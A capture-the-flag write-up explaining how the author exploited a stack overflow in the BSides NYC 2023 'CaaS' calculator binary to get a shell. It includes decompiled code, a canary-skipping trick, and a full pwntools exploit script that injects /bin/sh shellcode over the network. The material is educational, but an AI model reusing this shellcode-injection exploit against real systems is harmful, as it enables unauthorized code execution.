---
title: CaaS - BSides NYC 2023
date: 2023-04-23 23:05:19
tags: writeups
---

```
We are bringing capitalism to the cloud with Calculator as a service (CAAS). Try our trial version today!
```

This was a fun challenge from BSides NYC 2023 created by Include Security. The premise of the application is a calculator service that continuously loops through and allows us to perform calculations to a limited extent. If you play around with the calculator, you'll notice some funny bugs where the sum can't exceed 255 but this ends up having nothing to do with the exploit. 

```
~/bsidesnyc/includesecurity.com/caas  file caas                                                                                                                                                       
caas: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9906a441e40c6c9c4cd9949aecd4b7adf674a57e, for GNU/Linux 3.2.0, with debug_info, not stripped
~/bsidesnyc/includesecurity.com/caas  pwn checksec caas                                                                                                                                                     
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/home/victor/bsidesnyc/includesecurity.com/caas/caas'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We're dealing with a 32 bit executable that's dynamically linked (makes our lives easier) with the only security being a stack canary. This is important for our exploit which has a fun trick we'll need to employ to avoid overwriting the canary.

Here is the calculator function from our decompilation:

```
void calculator(void)

{
        int iVar1;
        int in_GS_OFFSET;
        byte *pbVar2;
        char *pcVar3;
        byte *pbVar4;
        byte local_38;
        byte local_37;
        char local_36;
        byte mustBeseventyone;
        int iterator;
        byte buf [32];
        int local_10;
        
        local_10 = *(int *)(in_GS_OFFSET + 0x14);
        iterator = 0;
        pbVar2 = buf;
        printf("\n[TRIAL] Calculator Service - Arithmetic operations are limited (Enter \'q\' to quit) - CAAS API KEY: %p\n",pbVar2);
        puts("================================\n");
        do {
                while( true ) {
                        printf("Enter an expression (e.g., 3 + 5): ",pbVar2);
                        pbVar4 = &local_37;
                        pcVar3 = &local_36;
                        pbVar2 = &local_38;
                        iVar1 = __isoc99_scanf(" %hhd %c %hhd",pbVar2,pcVar3,pbVar4);
                        if (iVar1 == 3) break;
                        pbVar2 = &mustBeseventyone;
                        iVar1 = __isoc99_scanf(&DAT_0804dd56,pbVar2,pcVar3,pbVar4);
                        if ((iVar1 == 1) && (mustBeseventyone == 0x71)) {
                                if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                                        __stack_chk_fail_local();
                                }
                                return;
                        }
                        puts("Invalid input. Please try again.");
                        do {
                                iVar1 = getchar();
                        } while (iVar1 != 10);
                }
                if (local_36 == '/') {
                        if (local_37 == 0) {
                                puts("Error: Division by zero is not allowed.");
                    /* WARNING: Subroutine does not return */
                                exit(1);
                        }
                        buf[iterator] = local_38 / local_37;
                }
                else if (local_36 < '0') {
                        if (local_36 == '-') {
                                buf[iterator] = local_38 - local_37;
                        }
                        else {
                                if ('-' < local_36) goto LAB_080495d3;
                                if (local_36 == '*') {
                                        buf[iterator] = local_38 * local_37;
                                }
                                else {
                                        if (local_36 != '+') goto LAB_080495d3;
                                        buf[iterator] = local_38 + local_37;
                                }
                        }
                }
                else {
LAB_080495d3:
                        puts("Error: Unsupported operator. Use +, -, *, or /.");
                }
                printf("%d %c %d = %d\n",(uint)local_38,(int)local_36,(uint)local_37,(uint)buf[iterator]);
                iterator = iterator + 1;
        } while( true );
}
```

The first thing to notice is that we get a stack leak for where the buffer "buf" is stored. The buffer is only supposed to hold 32 bytes but from the line `buf[iterator] = local_38 * local_37;` we can see that as we loop through the calculator we can control each byte of the buffer and there is nothing stopping us from overflowing the buffer since the calculations are in a "do while" loop. Theoretically if we can overflow the buffer, we can write shellcode instructions into the buffer and eventually be able to overwrite the instruction pointer to the stack leak given to us by the program. The rough pseudocode would be like this:

```
connect to service
have calculator perform calculations that equal each instruction of the shellcode we wish to inject
write dummy bytes
do something with the canary
try to return
```

There's a cool trick with the logic that we can use to avoid overwriting the canary. 

```
if (doing calculations) {
    ...
}
else {
LAB_080495d3:
        puts("Error: Unsupported operator. Use +, -, *, or /.");
}
printf("%d %c %d = %d\n",(uint)local_38,(int)local_36,(uint)local_37,(uint)buf[iterator]);
iterator = iterator + 1;
```

We can avoid writing to the buffer and still get to the next position by performing an invalid operation, in which case we just skip to the next index of the buffer. We can also get the looping function to return by getting into this if statement:

```
if ((iVar1 == 1) && (mustBeseventyone == 0x71)) {
        if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                __stack_chk_fail_local();
        }
        return;
}
```

Our final exploit looks like this:

```
from pwn import * 

# Runs system("/bin/sh") on our target
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p = remote('0.cloud.chals.io', 28972)

p.recvuntil(b'choice: ')

p.sendline(b'1')

p.recvuntil(b'API KEY: ')
bufLeak = p.recvline().decode()

canary = int(bufLeak, 16) + 0x40

p.recvuntil(b'5): ')

# Send our shellcode
for b in shellcode:
    p.sendline(b"1 * " + str(b).encode())

# Dummy bytes
for x in range(0, 9):
    p.sendline(b"4 * 5")

# Skip over the stack canasry
for can in p32(canary):
    p.sendline(b'1 )' + str(can).encode())

# Dummy bytes
for x in range(0, 12):
    p.sendline(b"4 * 5")

# Overwrite instruction pointer with stack leak
for pay in p32(int(bufLeak, 16)):
    p.sendline(b"1 * " + str(pay).encode())

# Return by sending invalid operation
p.sendline(b'113 ' + b'qq')

p.interactive()
```

With that, we get a shell on the server and can read the flag.